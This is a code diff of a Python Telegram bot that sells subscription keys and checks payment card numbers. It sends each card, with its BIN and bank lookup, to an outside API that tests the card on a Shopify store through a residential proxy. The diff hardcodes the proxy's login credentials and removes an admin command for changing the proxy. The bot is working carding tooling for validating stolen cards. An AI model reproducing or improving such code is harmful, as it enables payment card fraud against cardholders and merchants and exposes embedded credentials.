@@ -18,7 +18,9 @@ TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 OWNER_USERNAME = "@ESCROW2929"
 AUTHORIZED_ADMINS = {8785590284}
 DATA_FILE = "users_data.json"
-DEFAULT_PROXY = "brd-customer-hl_54dda161-zone-isp_proxy1-country-us:sxf92a7e5g32@brd.superproxy.io:33335"
+
+# Fixed Proxy inside code
+FIXED_PROXY = "brd-customer-hl_54dda161-zone-isp_proxy1-country-us:sxf92a7e5g32@brd.superproxy.io:33335"
 
 def load_data():
     if os.path.exists(DATA_FILE):
@@ -30,12 +32,11 @@ def load_data():
                     set(data.get("banned_users", [])),
                     set(data.get("sub_admins", [])),
                     data.get("active_keys", {}),
-                    {int(k): v for k, v in data.get("user_subscriptions", {}).items()},
-                    data.get("current_proxy", DEFAULT_PROXY)
+                    {int(k): v for k, v in data.get("user_subscriptions", {}).items()}
                 )
         except Exception as e:
             logger.error(f"Error loading data: {e}")
-    return set(), set(), set(), {}, {}, DEFAULT_PROXY
+    return set(), set(), set(), {}, {}
 
 def save_data():
     data = {
@@ -43,8 +44,7 @@ def save_data():
         "banned_users": list(BANNED_USERS),
         "sub_admins": list(SUB_ADMINS),
         "active_keys": ACTIVE_KEYS,
-        "user_subscriptions": USER_SUBSCRIPTIONS,
-        "current_proxy": CURRENT_PROXY
+        "user_subscriptions": USER_SUBSCRIPTIONS
     }
     try:
         with open(DATA_FILE, "w") as f:
@@ -52,7 +52,7 @@ def save_data():
     except Exception as e:
         logger.error(f"Error saving data: {e}")
 
-ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS, CURRENT_PROXY = load_data()
+ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()
 
 def is_main_admin(user_id):
     return user_id in AUTHORIZED_ADMINS
@@ -105,27 +105,12 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"• Banned Users: {len(BANNED_USERS)}\n\n"
         f"Available Commands:\n"
         f"/key <quantity> <time> (e.g., /key 25 1d)\n"
-        f"/addproxy <proxy_string>\n"
         f"/users (To see all users)\n"
         f"/announcement <message>\n"
     )
     if is_main_admin(user_id):
         panel_message += "/makeadmin <id>\n/removeadmin <id>\n/ban <id>\n/unban <id>"
     await update.message.reply_text(panel_message)
-
-async def add_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global CURRENT_PROXY
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        await update.message.reply_text("❌ Unauthorized.")
-        return
-    if not context.args:
-        await update.message.reply_text(f"❌ Usage: /addproxy user:pass@ip:port\nCurrent Proxy:\n`{CURRENT_PROXY}`", parse_mode="Markdown")
-        return
-    new_proxy = "".join(context.args).strip()
-    CURRENT_PROXY = new_proxy
-    save_data()
-    await update.message.reply_text(f"✅ Proxy Updated Successfully!\n\n`{CURRENT_PROXY}`", parse_mode="Markdown")
 
 async def show_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -314,7 +299,8 @@ async def process_card_string(card_line, user_full_name):
         bin_info, bank_info, country_info = await get_bin_info(bin_code)
         
         site_url = "https://ripnroll.com"
-        api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(CURRENT_PROXY)}"
+        # Using fixed proxy inside API call
+        api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(FIXED_PROXY)}"
         
         async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
             response = await client.get(api_url)
@@ -424,7 +410,6 @@ def main():
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("adminpannel", admin_pannel))
-    app.add_handler(CommandHandler("addproxy", add_proxy_command))
     app.add_handler(CommandHandler("users", show_users_command))
     app.add_handler(CommandHandler("announcement", announcement_command))
     app.add_handler(CommandHandler("key", generate_key))
@@ -442,4 +427,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
+                     
